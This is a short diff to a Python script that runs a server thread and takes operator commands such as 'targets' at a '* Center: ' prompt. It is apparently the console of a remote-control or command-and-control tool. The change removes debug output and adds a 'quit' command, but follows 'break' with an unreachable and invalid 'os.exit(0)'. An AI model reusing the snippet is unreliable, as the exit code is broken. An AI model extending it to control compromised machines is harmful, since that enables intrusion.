@@ -1,5 +1,4 @@
-#!/usr/bin/python
-
+#!/usr/bin/python3
 from termcolor import colored
 import socket
 import json
@@ -113,15 +112,10 @@ def main():
     t1 = threading.Thread(target=server)
     t1.start()
     while True:
-        print("Check Point 0")
-        try:
-            cmd = input('* Center: ')
-            print('O CMD 0 e: ' + cmd)
-        except:
-            cmd = ''
-        print('O CMD e: ' + cmd)
-        if cmd == '':
-            continue
+        cmd = input('* Center: ')
+        if cmd == 'quit':
+            break
+            os.exit(0)
         if cmd == 'targets':
             count = 0
             print("ENTER IN TARGETS")
